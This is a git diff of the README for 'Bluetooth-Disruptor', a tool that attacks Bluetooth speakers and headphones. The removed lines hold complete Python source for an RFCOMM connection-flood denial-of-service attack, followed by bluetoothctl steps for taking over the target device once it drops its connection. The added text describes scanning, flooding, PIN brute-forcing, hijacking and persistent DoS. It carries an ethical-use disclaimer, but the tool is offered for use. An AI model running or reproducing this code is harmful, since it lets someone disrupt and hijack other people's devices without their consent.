@@ -1,252 +1,117 @@
-# Bluetooth-Disruptor 💥
+Bluetooth-Disruptor: Unleashing Advanced Wireless Disruption
+Welcome to Bluetooth-Disruptor, a sophisticated Python tool engineered by Ares to perform advanced reconnaissance and disruption techniques against Bluetooth-enabled devices. This script is designed for ethical security research, penetration testing, and educational purposes, allowing you to explore the vulnerabilities of Bluetooth connections.
 
-A powerful Python-based tool designed for conducting **Bluetooth Denial-of-Service (DoS) attacks**. This utility aims to disrupt existing Bluetooth connections to a target device (like a smart speaker) by overwhelming it with connection requests, potentially allowing you to establish a new connection.
+Leveraging the power of scapy, bluetoothctl, and other essential system utilities, Bluetooth-Disruptor provides a robust framework for identifying nearby Bluetooth devices, initiating deauthentication floods, and attempting to hijack connections with conceptual advanced conceptual control capabilities.
 
-## 🌟 Features
+Features
+Intelligent Passive Reconnaissance: Discover nearby Bluetooth devices, gather detailed information including MAC addresses, names, RSSI (signal strength), and device classes.
+Dynamic Target Selection: Easily select a target device from the scanned list for focused disruption.
+Aggressive Deauthentication Flood: Perform a persistent deauthentication/stress attack to disrupt existing Bluetooth connections.
+Sophisticated Connection Hijacking: Attempt to pair and connect to the target device using common PINs, aiming to take over its connection.
+Conceptual Advanced Control (AVRCP): For successfully hijacked devices, the script includes conceptual capabilities for AVRCP (Audio/Video Remote Control Profile) commands, potentially allowing for media playback control (requires python-dbus and specific device support).
+Persistent DoS Mode: If hijacking fails, maintain a Denial-of-Service state to prevent the target from reconnecting to its original host.
+User-Friendly Interface: Clear, color-coded output and interactive prompts for an intuitive experience.
+Disclaimer
+For Ethical and Educational Use Only.
 
-* **Cross-Platform Compatibility:** Works seamlessly on both **Full Linux distributions** (e.g., Kali Linux, Ubuntu) and **Termux on Android**.
-* **Intuitive Command-Line Interface (CLI):** Easy-to-use arguments for flexible operation.
-* **Robust Error Handling:** Designed for stable execution with proper error management.
-* **Advanced Device Scanning:** Discover nearby Bluetooth devices with detailed information.
-* **Configurable DoS Parameters:** Adjust attack intensity with customizable attempts and delays.
-* **Verbose Output:** Get detailed real-time feedback on the attack progress.
+This tool is provided "as is" for ethical security research, educational purposes, and authorized penetration testing only. The developer assumes no liability for any misuse or damage caused by this software. Performing unauthorized attacks on devices you do not own or have explicit permission to test is illegal and unethical. Always ensure you have proper authorization before using this tool.
 
-## ⚠️ Disclaimer
+Prerequisites
+Before running Bluetooth-Disruptor, ensure you have the following installed on your Linux-based system. Root privileges are mandatory for proper operation.
 
-This tool is intended for **educational purposes and ethical penetration testing ONLY**. Use it responsibly and only on devices you own or have explicit permission to test. Unauthorized access or disruption of Bluetooth devices is illegal and unethical. The author is not responsible for any misuse or damage caused by this tool.
+System Tools
+These tools are typically available on most Linux distributions. If not, install them using your package manager (e.g., apt for Debian/Ubuntu, dnf for Fedora, pacman for Arch):
 
----
+hcitool: A utility to configure Bluetooth devices.
 
-## 🚀 Getting Started
-
-### Prerequisites
-
-Make sure you have Python 3 and the necessary Bluetooth development libraries installed.
-
-#### For Full Linux Distributions (Debian/Ubuntu-based):
-
-```bash
-sudo apt update
-sudo apt install python3-pip libbluetooth-dev bluez
-pip3 install pybluez
-For Termux on Android:
 Bash
 
-pkg update && pkg upgrade
-pkg install python python-pip bluez
-pip install pybluez
-# Note: Installing pybluez on Termux might require C/C++ development packages.
-# If you encounter errors, you may need to install 'pkg install clang' and 'pkg install make'.
-# Bluetooth functionalities in Termux might have limitations without root access.
+sudo apt install bluez # For Debian/Ubuntu, or your distribution's equivalent for bluez-utils
+bluetoothctl: The interactive Bluetooth control tool.
+
+Bash
+
+sudo apt install bluez # For Debian/Ubuntu, or your distribution's equivalent for bluez
+rfkill: A tool to query and change the state of wireless devices.
+
+Bash
+
+sudo apt install rfkill # For Debian/Ubuntu
+Python and Libraries
+Bluetooth-Disruptor requires Python 3 and several third-party libraries.
+
 Installation
-Clone the repository:
+Follow these steps to set up Bluetooth-Disruptor:
+
+Clone the Repository:
 
 Bash
 
-git clone [https://github.com/YOUR_GITHUB_USERNAME/Bluetooth-Disruptor.git](https://github.com/YOUR_GITHUB_USERNAME/Bluetooth-Disruptor.git)
+git clone https://github.com/your-username/Bluetooth-Disruptor.git
 cd Bluetooth-Disruptor
-Replace YOUR_GITHUB_USERNAME with your actual GitHub username.
+Install Python Dependencies:
+It's highly recommended to use a virtual environment.
 
-Make the script executable:
+First, create a requirements.txt file in the root of your project with the following content:
 
-Bash
-
-chmod +x bt-disruptor.py
-⚙️ Usage
-The bt-disruptor.py script utilizes command-line arguments for easy operation.
-
-1. Scan for Devices
-First, identify your target device's MAC address. Put your target speaker in pairing mode to make it discoverable.
+scapy
+colorama
+art
+dbus-python # Optional, for advanced control
+Then, set up and activate your virtual environment, and install the dependencies:
 
 Bash
 
-python3 bt-disruptor.py --scan
-# For more detailed output:
-python3 bt-disruptor.py --scan --verbose
-2. Initiate the DoS Attack
-Once you have the target's MAC address, you can launch the DoS attack.
-Open two terminals.
+# Create a virtual environment
+python3 -m venv venv
 
-In Terminal 1 (for the DoS attack):
+# Activate the virtual environment
+source venv/bin/activate
 
-Bash
+# Install required Python packages
+pip install -r requirements.txt
+Usage
+Bluetooth-Disruptor requires root privileges to interact with Bluetooth hardware.
 
-python3 bt-disruptor.py --target XX:XX:XX:XX:XX:XX 
-Replace XX:XX:XX:XX:XX:XX with the actual MAC address of your target speaker.
-
-You can customize the attack parameters:
+Run the Script:
 
 Bash
 
-python3 bt-disruptor.py --target XX:XX:XX:XX:XX:XX --attempts 2000 --delay 0.005 --port 1 --verbose
--t, --target: Target Bluetooth MAC address (required).
--s, --scan: Scan for nearby Bluetooth devices.
--a, --attempts: Number of connection attempts (default: 1000).
--d, --delay: Delay between attempts in seconds (default: 0.01s).
--p, --port: RFCOMM port to connect to (default: 1).
--v, --verbose: Enable verbose output for more details.
-3. Connect to the Speaker
-In Terminal 2 (to connect your device):
-As soon as the DoS attack begins and the speaker's current connection is disrupted, quickly attempt to connect your own device.
+sudo python3 bluetooth_disruptor.py
+Follow the Prompts:
 
-Using bluetoothctl (recommended for Linux):
+The script will first perform essential checks (root, system tools).
+It will then automatically prepare your Bluetooth adapter, ensuring it's powered on and discoverable, and disconnecting any existing connections for a clean slate.
+Device Discovery: The tool will initiate a passive scan for nearby Bluetooth devices. This scan will run for a predefined SCAN_DURATION (default: 60 seconds) or can be interrupted early with Ctrl+C.
+Target Selection: After the scan, a numbered list of discovered devices will be displayed. Enter the corresponding number to select your target.
+Disruption Mode Selection: Choose between "Headphone/Earbud Disruption" or "Speaker Disruption." This choice conceptually influences the type of advanced control attempts made (though actual D-Bus calls are placeholders and depend on device capabilities).
+Disruption Sequence:
+Deauthentication Flood: The script will begin an aggressive deauthentication flood on the target for a duration of DEAUTH_ATTEMPT_DURATION (default: 30 seconds). This aims to destabilize the target's existing connection.
+Connection Hijacking: If the deauthentication attempt is successful, the script will then try to pair and connect to the target, attempting to hijack its connection. It will try common PINs and rely on bluetoothctl's default agent.
+Advanced Conceptual Control: If hijacking is successful and python-dbus is installed, the script will attempt conceptual AVRCP commands.
+Persistent DoS: If hijacking fails, the script will enter a persistent DoS mode for 60 seconds to keep the target disrupted and prevent it from reconnecting to its original host.
+Report: A summary of the disruption attempt will be displayed.
+Dependencies Explained
+Here's a breakdown of the Python libraries and their roles in Bluetooth-Disruptor:
 
-Bash
+os: Standard library for interacting with the operating system, used for checking root privileges (os.geteuid()).
+sys: Provides access to system-specific parameters and functions, used for exiting the script (sys.exit()) and arguments (sys.argv).
+time: Provides various time-related functions, used for delays (time.sleep()) and measuring scan durations.
+subprocess: Allows spawning new processes, connecting to their input/output/error pipes, and obtaining their return codes. Crucial for running external system commands like bluetoothctl, hcitool, and rfkill.
+platform: Accesses underlying platform's identifying data, though not extensively used in this version.
+random: Generates pseudo-random numbers, used for varying delays in flood attacks to make them less predictable.
+shutil: Offers high-level file operations, used here for shutil.which() to check if system commands are present in the PATH and shutil.get_terminal_size() for banner formatting.
+re: Regular expression operations, used for parsing output from bluetoothctl commands (e.g., extracting MAC addresses, names, RSSI).
+scapy.all: A powerful interactive packet manipulation program. While imported, its core packet crafting capabilities are not explicitly used in the current bluetoothctl-based deauthentication and hijacking logic. It's listed as a dependency but its full potential isn't leveraged in the provided code snippet for actual Bluetooth packet injection. This might be a legacy dependency or a placeholder for future enhancements.
+colorama: Enables cross-platform colored terminal output. It's used extensively with Fore (foreground colors) and Style (text styles like bright) to make the script's output more readable and engaging. init(autoreset=True) ensures colors reset after each print statement.
+art: A Python library for generating ASCII art. Used specifically for text2art() to create the striking "Bluetooth Disruptor" banner at the start of the script.
+dbus & dbus.mainloop.glib: These are part of the python-dbus library, which provides a Python binding for D-Bus, a message bus system for inter-process communication. In this script, it's used conceptually to interact with the BlueZ (Linux Bluetooth stack) D-Bus interface, specifically for MediaPlayer1 (AVRCP) services to attempt advanced control (like play/pause) on connected devices. Its absence is gracefully handled, and advanced control features are skipped.
+Contributing
+Contributions are welcome! If you have suggestions for improvements, bug fixes, or new features, please open an issue or submit a pull request.
 
-bluetoothctl
-[bluetooth]# agent on
-[bluetooth]# pair XX:XX:XX:XX:XX:XX   # If not paired previously
-[bluetooth]# trust XX:XX:XX:XX:XX:XX
-[bluetooth]# connect XX:XX:XX:XX:XX:XX
-Replace XX:XX:XX:XX:XX:XX with the target speaker's MAC address.
+License
+This project is licensed under the MIT License - see the LICENSE file for details. (You should create a LICENSE file in your repository if you haven't already.)
 
-Alternatively, try connecting via your system's (or phone's) standard Bluetooth settings.
-
-💻 bt-disruptor.py Source Code
-Python
-
-import bluetooth
-import time
-import argparse
-import sys
-import os
-
-# --- Constants ---
-DEFAULT_ATTEMPTS = 1000
-DEFAULT_DELAY = 0.01
-DEFAULT_PORT = 1 # Common RFCOMM port
-
-# --- Utility Functions ---
-def get_platform():
-    """Determines the operating system/platform."""
-    if sys.platform.startswith('linux'):
-        if 'ANDROID_ROOT' in os.environ:
-            return "Termux/Android"
-        return "Linux"
-    return "Unknown"
-
-def display_status(message, level="INFO"):
-    """Prints status messages with color coding."""
-    if level == "INFO":
-        color = "\033[94m" # Blue
-    elif level == "SUCCESS":
-        color = "\033[92m" # Green
-    elif level == "WARNING":
-        color = "\033[93m" # Yellow
-    elif level == "ERROR":
-        color = "\033[91m" # Red
-    else:
-        color = "\033[0m" # Reset
-    print(f"{color}[{level}]\033[0m {message}")
-
-def mac_address_valid(mac):
-    """Validates if a string is a valid MAC address format."""
-    return len(mac) == 17 and all(c in "0123456789ABCDEF:" for c in mac) and mac.count(':') == 5
-
-# --- Core Functionality ---
-def scan_devices(duration=8, verbose=False):
-    """Scans for nearby Bluetooth devices."""
-    display_status(f"Scanning for Bluetooth devices for {duration} seconds...")
-    try:
-        nearby_devices = bluetooth.discover_devices(duration=duration, lookup_names=True, flush_cache=True, lookup_class=True)
-        if not nearby_devices:
-            display_status("No devices found. Ensure Bluetooth is on and devices are discoverable.", "WARNING")
-            return []
-
-        display_status(f"Found {len(nearby_devices)} devices:", "SUCCESS")
-        for addr, name, _class in nearby_devices:
-            display_status(f"  Name: {name if name else 'N/A'}, Address: {addr}, Class: {hex(_class) if _class else 'N/A'}")
-        return nearby_devices
-    except bluetooth.btcommon.BluetoothError as e:
-        display_status(f"Bluetooth scan error: {e}. Ensure Bluetooth adapter is enabled and permissions are correct.", "ERROR")
-        return []
-    except Exception as e:
-        display_status(f"An unexpected error occurred during scan: {e}", "ERROR")
-        return []
-
-def bluetooth_dos_attack(target_mac, num_attempts, delay, port, verbose=False):
-    """
-    Attempts a Bluetooth Denial of Service attack by repeatedly trying to connect.
-    This may disrupt existing connections or prevent new ones.
-    """
-    display_status(f"Initiating DoS attack on {target_mac} with {num_attempts} attempts at {delay}s intervals...")
-    attempt_count = 0
-    successful_brief_connections = 0
-
-    for i in range(num_attempts):
-        attempt_count += 1
-        try:
-            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
-            sock.connect((target_mac, port))
-            if verbose:
-                display_status(f"Attempt {attempt_count}: Brief connection to {target_mac}", "INFO")
-            successful_brief_connections += 1
-            sock.close()
-        except bluetooth.btcommon.BluetoothError as e:
-            if verbose:
-                display_status(f"Attempt {attempt_count}: Connection failed/refused (Expected for DoS): {e}", "WARNING")
-        except Exception as e:
-            display_status(f"Attempt {attempt_count}: Unexpected error: {e}", "ERROR")
-            
-        time.sleep(delay)
-
-    display_status(f"DoS attack finished. Made {attempt_count} attempts with {successful_brief_connections} brief connections.", "SUCCESS")
-    display_status("Now, attempt to connect your own device to the target speaker.", "INFO")
-
-def try_to_connect(target_mac):
-    """Provides instructions to connect using bluetoothctl or system settings."""
-    display_status("To connect your device, use bluetoothctl in a separate terminal:", "INFO")
-    print(f"\n  bluetoothctl")
-    print(f"  [bluetooth]# agent on")
-    print(f"  [bluetooth]# pair {target_mac}")
-    print(f"  [bluetooth]# trust {target_mac}")
-    print(f"  [bluetooth]# connect {target_mac}\n")
-    display_status("Alternatively, try connecting via your system's Bluetooth settings.", "INFO")
-
-# --- Main Execution ---
-if __name__ == "__main__":
-    current_platform = get_platform()
-    display_status(f"Bluetooth Disruptor v1.0 running on {current_platform}", "INFO")
-
-    parser = argparse.ArgumentParser(
-        description="A Bluetooth Denial-of-Service tool for disrupting speaker connections.",
-        formatter_class=argparse.RawTextHelpFormatter
-    )
-    parser.add_argument("-t", "--target", type=str, help="Target Bluetooth MAC address (e.g., 00:1A:2B:3C:4D:5E)")
-    parser.add_argument("-s", "--scan", action="store_true", help="Scan for nearby Bluetooth devices.")
-    parser.add_argument("-a", "--attempts", type=int, default=DEFAULT_ATTEMPTS,
-                        help=f"Number of connection attempts (default: {DEFAULT_ATTEMPTS}).")
-    parser.add_argument("-d", "--delay", type=float, default=DEFAULT_DELAY,
-                        help=f"Delay between attempts in seconds (default: {DEFAULT_DELAY}s).")
-    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
-                        help=f"RFCOMM port to connect to (default: {DEFAULT_PORT}).")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output for more details.")
-
-    args = parser.parse_args()
-
-    if args.scan:
-        display_status("Performing Bluetooth scan...", "INFO")
-        scan_devices(verbose=args.verbose)
-        sys.exit(0)
-
-    if not args.target:
-        display_status("Error: No target MAC address specified. Use -t or --target.", "ERROR")
-        parser.print_help()
-        sys.exit(1)
-
-    target_mac = args.target.strip().upper()
-    if not mac_address_valid(target_mac):
-        display_status(f"Error: Invalid MAC address format: {target_mac}", "ERROR")
-        sys.exit(1)
-
-    bluetooth_dos_attack(target_mac, args.attempts, args.delay, args.port, args.verbose)
-    try_to_connect(target_mac)
-🤝 Contribution
-Contributions are welcome! If you find bugs or have suggestions for improvements, please open an issue or submit a pull request.
-
-📄 License
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-🙏 Acknowledgements
-Inspired by the fascinating world of Bluetooth security and ethical hacking.
-<!-- end list -->
+Contact
+Developed by Ares.
+For questions or feedback, please open an issue on the GitHub repository.
